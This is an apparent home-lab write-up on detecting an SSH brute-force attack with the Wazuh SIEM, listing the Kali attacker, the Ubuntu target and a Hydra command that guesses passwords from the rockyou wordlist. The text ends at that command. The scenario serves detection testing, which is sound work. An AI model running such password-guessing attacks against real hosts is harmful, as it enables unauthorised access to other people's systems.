# SSH Brute Force Attack – Detection Scenario

## Overview

This scenario simulates a SSH brute force attack launched from a Kali Linux attacker machine against an Ubuntu target monitored by Wazuh.  
The goal is to validate that the SIEM correctly detects authentication failures, brute force patterns, and successful logins — and maps them to the MITRE ATT&CK framework.

---

## Lab Environment

| Role | Machine | IP Address |
|------|---------|------------|
| Attacker | Kali Linux (`kali01`) | 192.168.63.101 |
| Target | Ubuntu 22.04 LTS (`Ubuntu1`) | 192.168.63.109 |
| SIEM | Wazuh v4.14.4 | 192.168.63.101 |

The Wazuh agent (ID 012) is deployed and active on the target machine, forwarding logs in real time to the Wazuh manager.

---

## Attack Execution

### Tool used
- **Hydra v9.6** – network login brute force tool

### Command

```bash
hydra -l vboxuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.63.109 -t 4
